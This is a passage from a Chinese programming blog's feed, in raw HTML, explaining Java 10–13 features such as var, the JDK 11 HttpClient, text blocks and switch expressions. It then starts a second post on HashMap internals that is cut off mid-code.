计划在jdk10⾥⾯进⾏修复 <a href="https://bugs.openjdk.java.net/browse/JDK-8193856" target="_blank" rel="noopener">https://bugs.openjdk.java.net/browse/JDK-8193856</a></p><h1 id="JDK10和JDK11常⻅特性"><a href="#JDK10和JDK11常⻅特性" class="headerlink" title="JDK10和JDK11常⻅特性"></a>JDK10和JDK11常⻅特性</h1><h2 id="JDK10之局部变量类型推断var"><a href="#JDK10之局部变量类型推断var" class="headerlink" title="JDK10之局部变量类型推断var"></a>JDK10之局部变量类型推断var</h2><p>Java是⼀种强类型，许多流⾏的编程语⾔都已经⽀持局部变量类型推断，如js，Python，C++等</p><p>JDK10 可以使⽤var作为局部变量类型推断标识符 Local-Variable Type Inference（局部变量类型推断），顾名思义只能⽤做为局部变量 </p><p>注意 </p><ol><li>仅适⽤于局部变量，如 增强for循环的索引，传统for循环局部变量 </li><li>不能使⽤于⽅法形参、构造函数形参、⽅法返回类型或任何其他类型的变量声明 </li><li>标识符var不是关键字，⽽是⼀个保留类型名称，⽽且不⽀持类或接⼝叫var,也不符合命名规范 </li><li>可以⽤jshell试验或者IDEA</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据推断为 字符串类型</span></span><br><span class="line"><span class="keyword">var</span> strVar = <span class="string">"springboot"</span>;</span><br><span class="line">System.out.println(strVar <span class="keyword">instanceof</span> String);</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据10L 推断long 类型</span></span><br><span class="line"><span class="keyword">var</span> longVar = <span class="number">10L</span>;</span><br><span class="line"><span class="comment">//根据 true推断 boolean 类型</span></span><br><span class="line"><span class="keyword">var</span> flag = <span class="keyword">true</span>;</span><br><span class="line"><span class="comment">//var flag = Boolean.valueOf("true");</span></span><br><span class="line"><span class="comment">//System.out.println(flag instanceof Boolean);</span></span><br><span class="line"><span class="comment">// 推断 ArrayList&lt;String&gt;</span></span><br><span class="line"><span class="keyword">var</span> listVar = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">System.out.println(listVar <span class="keyword">instanceof</span> ArrayList);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 推断 Stream&lt;String&gt;</span></span><br><span class="line"><span class="keyword">var</span> streamVar = Stream.of(<span class="string">"aa"</span>, <span class="string">"bb"</span>, <span class="string">"cc"</span>);</span><br><span class="line">System.out.println(streamVar <span class="keyword">instanceof</span> Stream);</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line">    System.out.println(<span class="string">"这个是 flag 变量，值为true"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> (<span class="keyword">var</span> input = <span class="keyword">new</span> FileInputStream(<span class="string">"validation.txt"</span>)) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDK11之新增HttpClient客户端快速⼊⻔"><a href="#JDK11之新增HttpClient客户端快速⼊⻔" class="headerlink" title="JDK11之新增HttpClient客户端快速⼊⻔"></a>JDK11之新增HttpClient客户端快速⼊⻔</h2><p>这个功能在JDK 9中引⼊并在JDK 10中得到了更新 </p><p>最终JDK11正式发布，⽀持 HTT/1.1, HTTP/2</p><p>官⽅⽂档 <a href="http://openjdk.java.net/jeps/321" target="_blank" rel="noopener">http://openjdk.java.net/jeps/321</a></p><p><strong>常⽤类和接⼝讲解</strong> </p><ol><li>HttpClient.Builder——HttpClient 构建⼯具类 </li><li>HttpRequest.Builder——HttpRequest 构建⼯具类 </li><li>HttpRequest.BodyPublisher——将java对象转换为可发送的HTTP request body字节流, 如form表单提交</li><li>HttpResponse.BodyHandler——处理接收到的 Response Body</li></ol><p>创建HttpClient, 下⾯结果是⼀致的底层调⽤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var httpClient = HttpClient.newBuilder().build();</span></span><br><span class="line"> <span class="keyword">var</span> httpClient = HttpClient.newHttpClient();</span><br></pre></td></tr></table></figure><p>创建get请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//private static final String targetUrl = "http://api.xdclass.net/pub/api/v1/web/all_category";</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> URI uri = URI.create(targetUrl);</span><br><span class="line"></span><br><span class="line"><span class="comment">//GET请求</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testGet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//var httpClient = HttpClient.newHttpClient();</span></span><br><span class="line">    <span class="comment">//设置建⽴连接超时 connect timeout</span></span><br><span class="line">    <span class="keyword">var</span> httpClient = HttpClient.newBuilder().connectTimeout(Duration.ofMillis(<span class="number">5000</span>)).build();</span><br><span class="line">    <span class="comment">//设置读取数据超时 read timeout</span></span><br><span class="line">    <span class="keyword">var</span> request =</span><br><span class="line">        HttpRequest.newBuilder().timeout(Duration.ofMillis(<span class="number">3000</span>))</span><br><span class="line">        .header(<span class="string">"key1"</span>, <span class="string">"v1"</span>)</span><br><span class="line">        .header(<span class="string">"key2"</span>, <span class="string">"v2"</span>)</span><br><span class="line">        .uri(uri)</span><br><span class="line">        .build();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());</span><br><span class="line">        System.out.println(response.body());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDK11之标准HttpClient提交Post和异步请求"><a href="#JDK11之标准HttpClient提交Post和异步请求" class="headerlink" title="JDK11之标准HttpClient提交Post和异步请求"></a>JDK11之标准HttpClient提交Post和异步请求</h2><p>使⽤HttpClient提交Post请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String targetUrl=<span class="string">"https://api.xdclass.net/pub/api/v1/web/web_login"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> URI uri = URI.create(targetUrl);</span><br><span class="line"><span class="comment">//POST请求</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testPost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> httpClient = HttpClient.newHttpClient();</span><br><span class="line">    <span class="keyword">var</span> request = HttpRequest.newBuilder()</span><br><span class="line">        .uri(uri)</span><br><span class="line">        <span class="comment">//json格式则使⽤下⾯数据</span></span><br><span class="line">        <span class="comment">//.header("Content-Type", "application/json")</span></span><br><span class="line">        <span class="comment">//.POST(HttpRequest.BodyPublishers.ofString("&#123;\"phone\":\"13113777337\",\"pwd\":\"1234567890\"&#125;"))</span></span><br><span class="line">        <span class="comment">//form表单则使⽤下⾯配置</span></span><br><span class="line">        .header(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-formurlencoded"</span>)</span><br><span class="line"></span><br><span class="line">        .POST(HttpRequest.BodyPublishers.ofString(<span class="string">"phone=13113777337&amp;pwd=1234567890"</span>))</span><br><span class="line">                                                  .build();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> response = httpClient.send(request,HttpResponse.BodyHandlers.ofString());</span><br><span class="line">        System.out.println(response.body());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>使⽤HttpClient提交异步GET请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//异步GET请求</span></span><br><span class="line"><span class="comment">//private static final String targetUrl ="http://api.xdclass.net/pub/api/v1/web/all_category";</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> URI uri = URI.create(targetUrl);</span><br><span class="line"><span class="comment">//异步请求通过CompletableFuture实现。</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testAsynGet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> httpClient = HttpClient.newBuilder().build();</span><br><span class="line">    <span class="keyword">var</span> request =</span><br><span class="line">        HttpRequest.newBuilder().timeout(Duration.ofMillis(<span class="number">3000</span>))</span><br><span class="line">        .header(<span class="string">"key1"</span>, <span class="string">"v1"</span>)</span><br><span class="line">        .header(<span class="string">"key2"</span>, <span class="string">"v2"</span>)</span><br><span class="line">        .uri(uri).build();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//CompletableFuture&lt;String&gt; result = httpClient.sendAsync(request,HttpResponse.BodyHandlers.ofString()).thenApply(HttpResponse::body);</span></span><br><span class="line">        <span class="keyword">var</span> result = httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenApply(HttpResponse::body);</span><br><span class="line">        System.out.println(result.get());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDK11之标准HttpClient提交Http2请求"><a href="#JDK11之标准HttpClient提交Http2请求" class="headerlink" title="JDK11之标准HttpClient提交Http2请求"></a>JDK11之标准HttpClient提交Http2请求</h2><p>HTTP2协议的强制要求https，如果⽬标URI是HTTP的，则⽆法使⽤HTTP 2协议</p><p>如何判断⽹站是否是http2协议，浏览器，network⾯板，选择protocol</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210701150919.png" alt="image-20210701150912334"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String targetUrl = <span class="string">"https://http2.akamai.com/demo"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> URI uri = URI.create(targetUrl);</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testHttp2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> httpClient = HttpClient.newBuilder()</span><br><span class="line">        .connectTimeout(Duration.ofMillis(<span class="number">3000</span>))</span><br><span class="line">        .version(HttpClient.Version.HTTP_2)</span><br><span class="line">        .build();</span><br><span class="line">    <span class="keyword">var</span> request = HttpRequest.newBuilder()</span><br><span class="line">        .timeout(Duration.ofMillis(<span class="number">3000</span>))</span><br><span class="line">        .header(<span class="string">"key1"</span>, <span class="string">"v1"</span>)</span><br><span class="line">        .header(<span class="string">"key2"</span>, <span class="string">"v2"</span>)</span><br><span class="line">        .uri(uri)</span><br><span class="line">        .build();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> response = httpClient.send(request,HttpResponse.BodyHandlers.ofString());</span><br><span class="line">        System.out.println(response.body());</span><br><span class="line">        System.out.println(response.version());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JDK12和JDK13"><a href="#JDK12和JDK13" class="headerlink" title="JDK12和JDK13"></a>JDK12和JDK13</h1><h2 id="JDK⼀些基础知识科普"><a href="#JDK⼀些基础知识科普" class="headerlink" title="JDK⼀些基础知识科普"></a>JDK⼀些基础知识科普</h2><p>OpenJDK和OracleJDK版本区别：OpenJDK是JDK的开放源码版本，以GPL协议的形式发布（General Public License） Oracle JDK采⽤了商业实现</p><p><strong>LTS 是啥意思？</strong></p><p>Long Term Support ⻓期⽀持的版本，如JDK8、JDK11都是属于LTS JDK9 和 JDK10 这两个被称为“功能性的版本”不同, 两者均只提供半年的技术⽀持 甲⻣⽂释出Java的政策，每6个⽉会有⼀个版本的释出，⻓期⽀持版本每三年发布⼀次，根据 后续的发布计划，下⼀个⻓期⽀持版 Java 17 将于2021年发布</p><p><strong>8u20、11u20是啥意思？</strong></p><p>就是Java的补丁，⽐如JDK8的 8u20版本、8u60版本; java11的 11u20、11u40版本</p><p><strong>JDK要收费了？？？？</strong></p><p>Oracle 宣布 Java8 在 2019 年 1⽉之后停⽌更新，另外 Java11 及以后版本将不再提供免 费的 long-term support (LTS) ⽀持，猜测未来将有越来越多 Java 开发者转向使⽤ OpenJDK</p><p>OpenJDK是免费的，想要不断体验新特性的developer来说是不错的选择，OracleJDK不是免费的，对于企业⽤户来说，有钱的情况下就选择OracleJDK，对应oracleJDK，我们可以⾃⼰⽤来写代码，调试，学习即可</p><h2 id="JDK13新特性之多⾏⽂本块"><a href="#JDK13新特性之多⾏⽂本块" class="headerlink" title="JDK13新特性之多⾏⽂本块"></a>JDK13新特性之多⾏⽂本块</h2><p>JDK13发布，主要更新点 </p><ul><li><p><a href="https://openjdk.java.net/projects/jdk/13/" target="_blank" rel="noopener">https://openjdk.java.net/projects/jdk/13/</a> </p></li><li><p><a href="https://www.oracle.com/technetwork/java/javase/13-relnote-issues-5460548.html#NewFeature" target="_blank" rel="noopener">https://www.oracle.com/technetwork/java/javase/13-relnote-issues-5460548.html#NewFeature</a></p></li><li><p>JEP全称 ：JDK Enhancement Proposal 特性增强提议</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210701151750.png" alt="image-20210701151747753"></p></li></ul><p><strong>多⾏⽂本块</strong> </p><p>旧：在java代码⾥⾯编写多⾏源码带有特殊字符则需要转义，如HTML，sql等 </p><p>新：原⽣字符串⽂字（raw string literals），它可以跨多⾏源码⽽不对转义字符进⾏转义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//旧：</span></span><br><span class="line">String html = <span class="string">"&lt;html&gt;\n"</span> +</span><br><span class="line">     <span class="string">" &lt;body&gt;\n"</span> +</span><br><span class="line">     <span class="string">" &lt;p&gt;Hello, world&lt;/p&gt;\n"</span> +</span><br><span class="line">     <span class="string">" &lt;/body&gt;\n"</span> +</span><br><span class="line">     <span class="string">"&lt;/html&gt;\n"</span>;</span><br><span class="line">String query = <span class="string">"SELECT `EMP_ID`, `LAST_NAME` FROM `EMPLOYEE_TB`\n"</span> +</span><br><span class="line">    <span class="string">"WHERE `CITY` = 'INDIANAPOLIS'\n"</span> +</span><br><span class="line">    <span class="string">"ORDER BY `EMP_ID`, `LAST_NAME`;\n"</span>;</span><br><span class="line"><span class="comment">//新：</span></span><br><span class="line">String html = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">                &lt;html&gt;</span></span><br><span class="line"><span class="string">                &lt;body&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;Hello, world&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;/body&gt;</span></span><br><span class="line"><span class="string">                &lt;/html&gt;</span></span><br><span class="line"><span class="string">  "</span><span class="string">""</span>;</span><br><span class="line">String query = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">                 SELECT `EMP_ID`, `LAST_NAME` FROM `EMPLOYEE_TB`</span></span><br><span class="line"><span class="string">                 WHERE `CITY` = 'INDIANAPOLIS'</span></span><br><span class="line"><span class="string">                 ORDER BY `EMP_ID`, `LAST_NAME`;</span></span><br><span class="line"><span class="string">  "</span><span class="string">""</span>;</span><br><span class="line"><span class="comment">//对⽐⼀</span></span><br><span class="line"><span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">line 1</span></span><br><span class="line"><span class="string">line 2</span></span><br><span class="line"><span class="string">line 3</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span></span><br><span class="line"><span class="comment">//等效于字符串⽂字：</span></span><br><span class="line"><span class="string">"line 1\nline 2\nline 3\n"</span></span><br><span class="line">                  </span><br><span class="line"><span class="comment">//对⽐⼆</span></span><br><span class="line"><span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">line 1</span></span><br><span class="line"><span class="string">line 2</span></span><br><span class="line"><span class="string">line 3"</span><span class="string">""</span></span><br><span class="line"><span class="comment">//等效于字符串⽂字：</span></span><br><span class="line"><span class="string">"line 1\nline 2\nline 3"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对⽐三</span></span><br><span class="line"><span class="comment">//⽂本块可以表示空字符串，但不建议这样做，因为它需要两⾏代码：</span></span><br><span class="line">String empty = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">"</span><span class="string">""</span>;</span><br><span class="line"><span class="comment">//注意：错误例⼦</span></span><br><span class="line">String a = <span class="string">""</span><span class="string">""</span><span class="string">""</span>; <span class="comment">// no line terminator after opening delimiter</span></span><br><span class="line">String b = <span class="string">""</span><span class="string">" "</span><span class="string">""</span>; <span class="comment">// no line terminator after opening delimiter</span></span><br><span class="line">String c = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string"> "</span>;</span><br></pre></td></tr></table></figure><p><strong>开启新版⽀持 jshell –enable-preview</strong></p><h2 id="JDK13新特性之增强switch表达式"><a href="#JDK13新特性之增强switch表达式" class="headerlink" title="JDK13新特性之增强switch表达式"></a>JDK13新特性之增强switch表达式</h2><p>旧：没有break，则匹配的case后⾯会⼀直输出， value类型 可以是 byte、short、int 、char、 String 类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testOldSwitch1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">switch</span>(i)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            System.out.println(<span class="string">"zero"</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            System.out.println(<span class="string">"one"</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            System.out.println(<span class="string">"two"</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            System.out.println(<span class="string">"default"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testOldSwitch2</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(i)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            System.out.println(<span class="string">"zero"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            System.out.println(<span class="string">"one"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            System.out.println(<span class="string">"two"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            System.out.println(<span class="string">"default"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新：<strong>使⽤箭头函数，不⽤声明break，会⾃动终⽌，⽀持多个值匹配,使⽤逗号分隔</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testNewSwitch</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(i)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span> -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">"zero"</span>);</span><br><span class="line">            System.out.println(<span class="string">"这是多⾏语句"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>,<span class="number">11</span>,<span class="number">111</span> -&gt; System.out.println(<span class="string">"one"</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span> -&gt; System.out.println(<span class="string">"two"</span>);</span><br><span class="line">        <span class="keyword">default</span> -&gt; System.out.println(<span class="string">"default"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后：</p><ol><li>多关注LTS版本如JDK8,JDK11,JDK17(未发布)，这个是重点需要学的；</li><li>功能性的则挑选常⽤的特性进⾏掌握即可； </li><li>预览性的可以先不学或者简单知道就⾏，例如 AOT，ZGC,CDS 这些；</li><li>未来的LTS版本中会更新，所以可以关注未来的LTS版本</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JDK8新特性之接⼝和⽇期处理&quot;&gt;&lt;a href=&quot;#JDK8新特性之接⼝和⽇期处理&quot; class=&quot;headerlink&quot; title=&quot;JDK8新特性之接⼝和⽇期处理&quot;&gt;&lt;/a&gt;JDK8新特性之接⼝和⽇期处理&lt;/h1&gt;&lt;h2 id=&quot;JDK8之default关
      
    
    </summary>
    
    
      <category term="JDK" scheme="https://blog.kaluna.top/categories/JDK/"/>
    
    
      <category term="JDK8~13新特性" scheme="https://blog.kaluna.top/tags/JDK8-13%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>HashMap集合</title>
    <link href="https://blog.kaluna.top/2021/06/15/HashMap%E9%9B%86%E5%90%88/"/>
    <id>https://blog.kaluna.top/2021/06/15/HashMap%E9%9B%86%E5%90%88/</id>
    <published>2021-06-15T01:45:57.338Z</published>
    <updated>2021-06-16T08:31:20.917Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HashMap集合简介"><a href="#HashMap集合简介" class="headerlink" title="HashMap集合简介"></a>HashMap集合简介</h2><p>​    HashMap基于哈希表的Map接口实现，是以key-value存储形式存在，即主要用来存放键值对。HashMap 的实现不是同步的，这意味着它不是线程安全的。它的key、value都可以为null。此外，HashMap中的映射不是有序的。</p><p>​    JDK1.8 之前 HashMap 由 数组+链表 组成的，数组是 HashMap 的主体，链表则是主要为了解决哈希冲突<strong>(两个对象调用的hashCode方法计算的哈希码值一致导致计算的数组索引值相同)</strong>而存在的（“拉链法”解决冲突）.JDK1.8 以后在解决哈希冲突时有了较大的变化，<strong>当链表长度大于阈值（或者红黑树的边界值，默认为 8）并且当前数组的长度大于64时，此时此索引位置上的所有数据改为使用红黑树存储。</strong></p><p>补充：将链表转换成红黑树前会判断，即使阈值大于8，但是数组长度小于64，此时并不会将链表变为红黑树。而是选择进行数组扩容。</p><p>这样做的目的是因为数组比较小，尽量避开红黑树结构，这种情况下变为红黑树结构，反而会降低效率，因为红黑树需要进行左旋，右旋，变色这些操作来保持平衡 。同时数组长度小于64时，搜索时间相对要快些。所以综上所述为了提高性能和减少搜索时间，底层在阈值大于8并且数组长度大于64时，链表才转换为红黑树。具体可以参考 <code>treeifyBin</code>方法。</p><p>当然虽然增了红黑树作为底层数据结构，结构变得复杂了，但是阈值大于8并且数组长度大于64时，链表转换为红黑树时，效率也变的更高效。 </p><p>小结：</p><p>特点：</p><p>1.存取无序的</p><p>2.键和值位置都可以是null，但是键位置只能是一个null</p><p>3.键位置是唯一的，底层的数据结构控制键的</p><p>4.jdk1.8前数据结构是：链表 + 数组  jdk1.8之后是 ： 链表 + 数组  + 红黑树</p><p>5.阈值(边界值) &gt; 8 并且数组长度大于64，才将链表转换为红黑树，变为红黑树的目的是为了高效的查询。</p><h2 id="HashMap集合底层的数据结构"><a href="#HashMap集合底层的数据结构" class="headerlink" title="HashMap集合底层的数据结构"></a>HashMap集合底层的数据结构</h2><h3 id="数据结构概念"><a href="#数据结构概念" class="headerlink" title="数据结构概念"></a>数据结构概念</h3><pre><code>数据结构是计算机存储、组织数据的方式。数据结构是指相互之间存在一种或多种特定关系的数据元素的集合。通常情况下，精心选择的数据结构可以带来更高的运行或者存储效率。数据结构往往同高效的检索算法和索引技术有关。 </code></pre><p>数据结构：就是存储数据的一种方式。ArrayList LinkedList</p><p>在JDK1.8 之前 HashMap 由 <strong>数组+链表</strong> 数据结构组成的。</p><p>在JDK1.8 之后 HashMap 由 <strong>数组+链表 +红黑树</strong>数据结构组成的。</p><h3 id="HashMap底层的数据结构存储数据的过程"><a href="#HashMap底层的数据结构存储数据的过程" class="headerlink" title="HashMap底层的数据结构存储数据的过程"></a>HashMap底层的数据结构存储数据的过程</h3><p>存储过程如下所示：</p><p>使用的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 